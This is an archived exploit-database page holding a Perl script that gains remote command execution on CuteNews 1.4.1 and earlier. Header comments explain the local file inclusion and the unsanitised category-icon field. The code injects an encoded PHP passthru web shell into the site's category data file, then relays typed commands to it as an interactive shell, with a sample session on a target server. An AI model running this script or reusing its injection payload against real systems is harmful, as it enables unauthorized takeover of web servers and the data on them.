<html>
<head>
<title>CuteNews <= 1.4.1 (categories.mdu) Remote Command Execution Exploit</title>
<pre>
#!/usr/bin/perl
#
# cijfer-cnxpl - CuteNews &lt;=1.4.1 Remote Command Execution
#
# Copyright (c) 2005 cijfer &lt;cijfer@netti.fi&gt;
# All rights reserved.           
#
## 1. example
#
# [cijfer@kalma:/research]$ ./cijfer-cnxpl.pl -h www.xxxx.org -d /news
# [cijfer@www.xxxx.org /]$ id;uname -a
# uid=48(apache) gid=48(apache) groups=48(apache),29000(web_serving) context=root:system_r:httpd_sys_script_t
# Linux server.xxxx.org 2.6.13-1.1532_FC4 #1 Thu Oct 20 01:30:08 EDT 2005 i686 i686 i386 GNU/Linux
# [cijfer@www.xxxx.org /]$
#
## 2. explanation
#
# this particular vulnerability is already known (sort of). a
# bug as exact as this one was found by rgod in CuteNews. the
# sole difference between his and my bug, are the files that
# are being exploited. while his was a bug using the following
# string:
#
#	show_archives.php?template=../inc/ipban.mdu%00
#
# i found my bug in:
#
#	show_archives.php?template=../inc/categories.mdu%00
#
## 3. the bug
#
# the bug lies in categories.mdu, located in the /inc/ folder
# of the cutenews directory.
#
# by using the 'template' variable in show_archives.php, we
# can include any local files. in this case, we're including
# categories.mdu. why? every .mdu file within the cutenews 
# package has raw PHP code within it, that is not protected
# like the normal .php files.
#
# $template gets sanitized, but can be bypassed depending on
# php configuration! this is why on some 1.4.0's it works and
# on some others it does not. it all depends on configuration
# and whether or not register_globals needs to be on.
#
# 	if(file_exists(&quot;$cutepath/data/${template}.tpl&quot;)){ require(&quot;$cutepath/data/${template}.tpl&quot;); }
#       ...
#
# looking into categories.mdu, we notice the following to
# create our exploit string:
#
# 	if($member_db[1] != 1){ msg(&quot;error&quot;, &quot;Access Denied&quot;, &quot;You don't have permission to edit categories&quot;); }
#       ... 
#
#	elseif($action == &quot;doedit&quot;)
# 	{
#       ...
#
# cannot write arbitrary php code to $cat_name :(
#
#	$cat_name = htmlspecialchars(stripslashes($cat_name)); 
#       ...
#
# $cat_icon lacks sanitization :))!
#
#	fwrite($new_cats, &quot;$catid|$cat_name|$cat_icon|||\n&quot;);
#       ...
#
# adding together all these elements, it is possible to inject
# php code into data/category.db.php and from there, use our
# injected code to either include a remote php shell, or run
# commands on the system.
#
##
#
# $Id: cijfer-cnxpl.pl,v 0.2 2005/12/26 03:36:00 cijfer Exp cijfer $

use IO::Socket;
use Getopt::Std;
use URI::Escape;

getopts(&quot;h:d:&quot;);

$host = $opt_h;
$dirs = $opt_d;
$good = 0;

if(!$host)
{
	print &quot;cijfer-cnxpl.pl by cijfer\n&quot;;
        print &quot;usage: $0 -h &lt;hostname&gt; -d [/directory]\r\n&quot;;
        exit();
}

while()
{
	print &quot;[cijfer@&quot;.$host.&quot; /]\$ &quot;;
	while(&lt;STDIN&gt;)
	{
		$cmds=$_;
		chomp($cmds);
		last;
	}

if(!$dirs)
{
	$dirs = &quot;/cutenews&quot;;
}

$string  = $dirs;
$string .= &quot;/show_archives.php?template=../inc/categories.mdu%00&quot;;
$string .= &quot;&amp;member_db[1]=1&quot;;
$string .= &quot;&amp;action=doedit&quot;;                                #can be changed from 'doedit' to 'add' if no categories exist
$string .= &quot;&amp;cat_name=cijfer&quot;;
$string .= &quot;&amp;catid=1&quot;;                                      #can be changed to different value if starting catid != 0
$string .= &quot;&amp;cat_icon=%3C%3Fpassthru%28%24_GET%5Bcij%5D%29%3Bdie%28%29%3B%3F%3E&quot;;

$cijfer  = $dirs;
$cijfer .= &quot;/data/category.db.php?cij=&quot;;
$cijfer .= uri_escape(&quot;echo; &quot;);
$cijfer .= &quot;%20%65%63%68%6F%20%5F%53%54%41%52%54%5F%3B%20&quot;; # _START_
$cijfer .= uri_escape($cmds);
$cijfer .= &quot;%3B%20%65%63%68%6F%20%5F%45%4E%44%5F&quot;;          # _END_

$sock = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $host, PeerPort =&gt; 80) || die &quot;error: connect()\n&quot;;

print $sock &quot;GET $string HTTP/1.1\n&quot;;
print $sock &quot;Host: $host\n&quot;;
print $sock &quot;Accept: */*\n&quot;;
print $sock &quot;Connection: close\n\n&quot;;

$sock = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $host, PeerPort =&gt; 80) || die &quot;error: connect()\n&quot;;

print $sock &quot;GET $cijfer HTTP/1.1\n&quot;;
print $sock &quot;Host: $host\n&quot;;
print $sock &quot;Accept: */*\n&quot;;
print $sock &quot;Connection: close\n\n&quot;;

while($result = &lt;$sock&gt;)
{
	if($sock =~ /^403/)
	{
		print &quot;error: 403\n&quot;;
		exit();
	}
	if($result =~ /^_END_/)
	{
		$good=0;
	}

	if($good==1)
	{
        	print $result;
	}

	if($result =~ /^_START_/)
	{
		$good=1;
	}
}
}

# milw0rm.com [2006-01-01]
</pre>
</html>

